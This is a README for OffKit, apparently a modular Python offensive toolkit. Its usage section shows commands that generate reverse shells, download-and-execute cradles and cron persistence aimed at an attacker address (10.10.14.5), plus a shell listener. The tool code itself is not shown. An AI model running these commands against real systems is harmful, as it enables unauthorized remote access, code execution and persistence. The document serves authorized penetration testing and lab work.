# OffKit

Modular offensive toolkit for lab and authorized testing.

D3F4ULT

## Modules

| Module | Function |
|--------|----------|
| `recon` | DNS resolution, reverse lookup, HTTP headers, common-port banners |
| `scan` | Multi-threaded TCP port scanner |
| `shell` | Reverse / bind shell one-liner generator |
| `payload` | Download-and-execute cradles (PowerShell, bash, Python, certutil) |
| `persist` | Persistence technique generators (Linux + Windows) |
| `enum` | Post-compromise enumeration command reference |
| `listener` | TCP listener for reverse shells |

Python 3.8+. No external dependencies.

## Install

```bash
git clone https://github.com/D3F4UL7T/OffKit.git
cd OffKit
python3 offkit.py list
```

## Usage

```bash
python3 offkit.py list
python3 offkit.py recon -t example.com --headers --ports
python3 offkit.py scan  -t 192.168.1.10 -p 1-1000 -T 150
python3 offkit.py shell -t reverse -H 10.10.14.5 -p 4444 --lang bash
python3 offkit.py shell -k python_reverse_short -H 10.10.14.5 -p 443 --encode
python3 offkit.py payload --list
python3 offkit.py payload -c ps_download_iex -H 10.10.14.5 -p 80 -f stage.ps1
python3 offkit.py persist --list
python3 offkit.py persist -t linux_cron -H 10.10.14.5 -p 4444
python3 offkit.py enum --os linux
python3 offkit.py listener -p 4444
python3 offkit.py listener -p 4444 -i
```

## Layout

```
OffKit/
├── offkit.py
├── modules/
│   ├── recon.py
│   ├── scan.py
│   ├── shell.py
│   ├── payload.py
│   ├── persist.py
│   ├── enum.py
│   └── listener.py
├── payloads/
├── docs/
├── requirements.txt
├── LICENSE
└── README.md
```

## Notes

Continues prior work:

Lab and authorized use only. Unauthorized access is illegal. Author assumes no liability for misuse.
